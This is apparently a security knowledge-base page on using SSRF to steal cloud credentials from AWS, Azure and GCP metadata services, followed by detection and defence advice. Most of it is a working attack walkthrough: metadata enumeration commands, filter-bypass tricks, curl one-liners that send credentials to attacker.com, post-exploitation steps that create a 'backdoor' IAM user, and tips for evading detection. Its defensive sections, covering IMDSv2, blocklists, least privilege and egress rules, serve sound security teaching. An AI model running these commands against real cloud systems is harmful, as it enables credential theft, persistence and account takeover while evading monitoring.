#cloud #aws #azure #gcp #ssrf #imds #metadata

The metadata service is a local HTTP endpoint available on every cloud instance. It returns live credentials and configuration. SSRF vulnerabilities in cloud applications can expose these credentials, leading to full account compromise.

---

## Metadata Service Overview

Every cloud instance has a local metadata endpoint, only reachable from that instance:

**AWS:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/api/token (IMDSv2)
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
(Requires: Metadata:true header)
```

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/
(Requires: Metadata-Flavor:Google header)
```

The endpoint hands back:
- Instance identity & temporary credentials
- Configuration (instance name, tags, region)
- SSH keys
- Network interfaces
- User data scripts

---

## IMDSv1 vs IMDSv2

### IMDSv1 (Original, Vulnerable)
```
# Simple HTTP GET
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Vulnerability:** SSRF can reach it directly. No token required.

### IMDSv2 (Recommended)
```
# Step 1: Get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Defense:** Requires a PUT request + response handling. Blocks simple SSRF.

---

## Attack Chain: SSRF → IMDS → Credentials

### Step 1: Find SSRF
Application fetches URLs on behalf of user:
```
# Normal use
http://app.com?url=https://example.com/image.jpg
# App fetches it, returns image

# SSRF attempt
http://app.com?url=http://169.254.169.254/latest/meta-data/
# App fetches metadata, returns response
```

**Common SSRF locations:**
- Link preview functionality
- Image proxy / resize
- Video thumbnail generation
- Document preview / parsing
- Webhook callbacks

### Step 2: Enumerate Metadata
```bash
# AWS: List available metadata
curl http://169.254.169.254/latest/meta-data/

# AWS: Get instance identity
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: role name

# AWS: Get credentials for that role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
```

### Step 3: Use Credentials
```bash
# Configure stolen credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJalrX..."
export AWS_SESSION_TOKEN="AQoDYXdzEJr..."

# Access AWS as the instance's role
aws s3 ls
aws iam list-users
aws ec2 describe-instances
```

---

## Real-World Example: Capital One Breach (2019)

1. **SSRF:** Metadata API misconfiguration in Kubernetes allowed requests to metadata service
2. **Credentials:** Fetched credentials for temporary role
3. **Data Access:** Used credentials to access S3 bucket with customer data
4. **Result:** 100 million customer records exposed

The entire chain was enabled by weak SSRF validation + IMDSv1 (no token requirement).

---

## Exploitation Tactics

### Bypasssing WAF/Firewalls

**DNS Rebinding:**
```
# 1. Set up attacker domain: dns.attacker.com
# 2. Return localhost/IMDS IPs after initial lookup
# 3. App caches, then requests to rebounded domain hit localhost
```

**SSRF with Protocol Tricks:**
```
# Different protocols may bypass filters
http://169.254.169.254/...
https://169.254.169.254/...
gopher://169.254.169.254/...
dict://169.254.169.254/...
```

**Localhost Variations:**
```
127.0.0.1
127.0.1.1
localhost
0.0.0.0 (some contexts)
[::1] (IPv6)
```

### Credential Exfiltration

```bash
# Simple exfil: Send to attacker server
curl http://attacker.com/exfil?creds=$(curl http://169.254.169.254/...)

# Or encode and send in headers
curl http://169.254.169.254/.../credentials | \
  curl -H "X-Stolen: $(cat)" http://attacker.com
```

---

## Post-Exploitation: What You Can Do

Once you have credentials:

```bash
# AWS: List all S3 buckets
aws s3 ls

# AWS: Access specific bucket
aws s3 cp s3://sensitive-data/secrets.txt .

# AWS: Check permissions (enumerate what this role can do)
aws iam list-attached-role-policies --role-name WebAppRole

# AWS: Create persistence (new IAM user)
aws iam create-user --user-name backdoor
aws iam create-access-key --user-name backdoor

# AWS: Enumerate other resources
aws ec2 describe-instances
aws rds describe-db-instances
aws secretsmanager list-secrets
```

---

## Detection & Evasion

### What Gets Logged
- **CloudTrail:** Every API call made with the credentials
- **VPC Flow Logs:** Outbound SSRF requests (if enabled)
- **ALB/NLB Logs:** HTTP requests to 169.254.169.254
- **Application Logs:** SSRF attempts (if captured)

### Detection Signatures
- Requests to 169.254.169.254 (AWS), 169.254.169.254 (Azure), metadata.google.internal
- Unusual SSRF parameter values (169.254.*, localhost, 127.0.0.1)
- PUT requests to /latest/api/token (IMDSv2 token requests)

### Evasion
- **Request during off-hours:** Less scrutiny
- **Use legitimate domains first:** dns.attacker.com → rebind to localhost
- **Encode the IP:** Use hex (0xA9FEA9FE) or octal
- **Chain with legitimate requests:** Mix metadata queries with normal traffic
- **Use instance credentials:** Stolen credentials from one instance querying others looks legitimate

---

## Defense: Breaking the Chain

### Immediate: IMDSv2
Enforce IMDSv2 requirement (token-based):

**AWS:**
```
aws ec2 modify-instance-metadata-options \
  --instance-id i-12345 \
  --http-tokens required
```

**Effect:** Blocks simple SSRF. Requires PUT + response handling.

### Application Level: Validate SSRF
```python
# Whitelist allowed URLs
ALLOWED_DOMAINS = ["example.com", "cdn.example.com"]

def fetch_url(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Disallowed domain")
    # Fetch...
```

Blocklist private ranges:
```python
PRIVATE_RANGES = [
    "169.254.0.0/16",    # Metadata
    "127.0.0.0/8",       # Localhost
    "10.0.0.0/8",        # Private
    "172.16.0.0/12",     # Private
    "192.168.0.0/16"     # Private
]
```

### IAM Level: Least Privilege
Instance role should only have permissions it needs:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::app-data/*"
  }]
}
```

NOT:
```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

### Network: Firewall Rules
Restrict egress to metadata endpoint:
```
# AWS Security Group: Deny outbound to 169.254.169.254
# Azure NSG: Deny outbound to 169.254.169.254
# GCP Firewall: Deny egress to metadata.google.internal
```

---

## Tools

- **Curl/wget:** Manual metadata enumeration
- **Metasploit:** SSRF scanner, metadata extraction modules
- **Burp Suite:** Identify and test SSRF
- **OWASP ZAP:** Automated SSRF testing

---

## Related Guides
- [[Cloud Fundamentals]] — metadata service overview
- [[Server-Side Request Forgery (SSRF)]] — general SSRF techniques
- [[Cloud Privilege Escalation]] — escalating with stolen credentials
- [[AWS Enumeration]] — enumerating AWS after credential theft
